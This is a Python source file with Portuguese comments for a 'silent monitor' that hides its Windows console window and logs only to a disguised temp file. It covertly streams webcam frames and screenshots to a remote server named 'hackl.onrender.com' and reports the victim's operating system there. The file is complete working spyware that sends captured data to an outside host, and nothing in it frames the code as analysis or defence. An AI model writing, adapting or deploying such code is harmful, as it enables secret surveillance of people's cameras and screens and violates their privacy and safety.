import cv2
import socketio
import base64
import time
import requests
import platform
import threading
import sys
import os
import mss
import numpy as np
import logging
from dotenv import load_dotenv

# Carregar variáveis de ambiente
load_dotenv()

# Configurar logging (arquivo apenas, sem console)
log_file = os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Temp', 'system.log')
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(log_file, mode='a')
    ]
)
logger = logging.getLogger(__name__)

# CONFIGURAÇÕES (via .env ou padrão)
SERVER_URL = os.getenv('SERVER_URL', 'https://hackl.onrender.com')
LINK_CODE = os.getenv('LINK_CODE', 'NATIVE_CLIENT')
CAMERA_FPS = int(os.getenv('CAMERA_FPS', 6))
SCREEN_FPS = int(os.getenv('SCREEN_FPS', 2))
JPEG_QUALITY_CAMERA = int(os.getenv('JPEG_QUALITY_CAMERA', 25))
JPEG_QUALITY_SCREEN = int(os.getenv('JPEG_QUALITY_SCREEN', 20))

class SilentMonitor:
    """Monitor silencioso - sem interface gráfica"""
    
    def __init__(self):
        try:
            self.sio = socketio.Client(
                reconnection=True, 
                reconnection_attempts=0, 
                reconnection_delay=1,
                logger=False,
                engineio_logger=False
            )
            self.running = False
            self.sct = mss.mss()
            logger.info("Monitor inicializado em modo silencioso")
        except Exception as e:
            logger.error(f"Erro ao inicializar monitor: {e}")
            raise

    def log_access(self):
        """Registra acesso no servidor"""
        try:
            response = requests.post(
                f"{SERVER_URL}/log_access", 
                json={
                    'code': LINK_CODE,
                    'browser': 'Silent Monitor Client',
                    'os': platform.system() + " " + platform.release(),
                    'email': 'silent@monitor.app'
                }, 
                timeout=5
            )
            
            if response.status_code == 200:
                logger.info("Acesso registrado no servidor")
            else:
                logger.warning(f"Resposta inesperada do servidor: {response.status_code}")
                
        except requests.exceptions.Timeout:
            logger.error("Timeout ao registrar acesso")
        except requests.exceptions.ConnectionError:
            logger.error("Erro de conexão ao registrar acesso")
        except Exception as e:
            logger.error(f"Erro desconhecido ao registrar acesso: {e}")

    def capture_camera(self):
        """Captura e transmite frames da câmera"""
        cap = None
        try:
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                logger.error("Não foi possível abrir a câmera")
                return
            
            logger.info("Captura de câmera iniciada")
            frame_interval = 1.0 / CAMERA_FPS
            
            while self.running:
                try:
                    ret, frame = cap.read()
                    if not ret:
                        time.sleep(1)
                        continue
                    
                    # Redimensionar e comprimir
                    frame = cv2.resize(frame, (480, 360))
                    _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, JPEG_QUALITY_CAMERA])
                    jpg_as_text = base64.b64encode(buffer).decode('utf-8')
                    
                    # Enviar via SocketIO
                    self.sio.emit('native_frame', {
                        'id': self.sio.sid,
                        'frame': 'data:image/jpeg;base64,' + jpg_as_text
                    })
                    
                except Exception as e:
                    logger.error(f"Erro ao processar frame da câmera: {e}")
                
                time.sleep(frame_interval)
                
        except Exception as e:
            logger.error(f"Erro crítico na captura de câmera: {e}")
        finally:
            if cap:
                cap.release()
                logger.info("Câmera liberada")

    def capture_screen(self):
        """Captura e transmite frames da tela"""
        try:
            logger.info("Captura de tela iniciada")
            frame_interval = 1.0 / SCREEN_FPS
            
            while self.running:
                try:
                    # Captura o monitor principal
                    monitor = self.sct.monitors[1] if len(self.sct.monitors) > 1 else self.sct.monitors[0]
                    sct_img = self.sct.grab(monitor)
                    
                    # Converte para formato OpenCV
                    img = np.array(sct_img)
                    img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
                    
                    # Redimensiona para 800x450 (16:9)
                    img = cv2.resize(img, (800, 450))
                    _, buffer = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, JPEG_QUALITY_SCREEN])
                    jpg_as_text = base64.b64encode(buffer).decode('utf-8')
                    
                    # Enviar via SocketIO
                    self.sio.emit('native_screen', {
                        'id': self.sio.sid,
                        'frame': 'data:image/jpeg;base64,' + jpg_as_text
                    })
                    
                except Exception as e:
                    logger.error(f"Erro ao processar frame da tela: {e}")
                
                time.sleep(frame_interval)
                
        except Exception as e:
            logger.error(f"Erro crítico na captura de tela: {e}")

    def start(self):
        """Inicia o monitoramento silencioso"""
        try:
            logger.info("=" * 50)
            logger.info("Iniciando monitoramento silencioso...")
            logger.info(f"Servidor: {SERVER_URL}")
            logger.info("=" * 50)
            
            # Conectar ao servidor
            logger.info("Conectando ao servidor...")
            self.sio.connect(
                SERVER_URL, 
                socketio_path='/socket.io', 
                transports=['websocket', 'polling']
            )
            logger.info("Conectado ao servidor")
            
            self.running = True
            self.log_access()
            
            # Iniciar threads de captura
            t1 = threading.Thread(target=self.capture_camera, daemon=True, name="CameraThread")
            t2 = threading.Thread(target=self.capture_screen, daemon=True, name="ScreenThread")
            
            t1.start()
            t2.start()
            
            logger.info("Threads de captura iniciadas")
            
            # Manter vivo indefinidamente
            while self.running:
                time.sleep(1)
                
        except socketio.exceptions.ConnectionError as e:
            logger.error(f"Erro de conexão com o servidor: {e}")
        except Exception as e:
            logger.error(f"Erro inesperado: {e}")
        finally:
            self.cleanup()

    def cleanup(self):
        """Limpa recursos antes de encerrar"""
        logger.info("Limpando recursos...")
        self.running = False
        try:
            if self.sio.connected:
                self.sio.disconnect()
            if self.sct:
                self.sct.close()
        except Exception as e:
            logger.error(f"Erro ao limpar recursos: {e}")
        logger.info("Encerrando...")

if __name__ == "__main__":
    try:
        # Esconder console no Windows
        if sys.platform == 'win32':
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        
        monitor = SilentMonitor()
        monitor.start()
    except KeyboardInterrupt:
        logger.info("Interrompido pelo usuário")
    except Exception as e:
        logger.critical(f"Erro crítico: {e}")
        # Não fazer sys.exit() para manter rodando
        pass


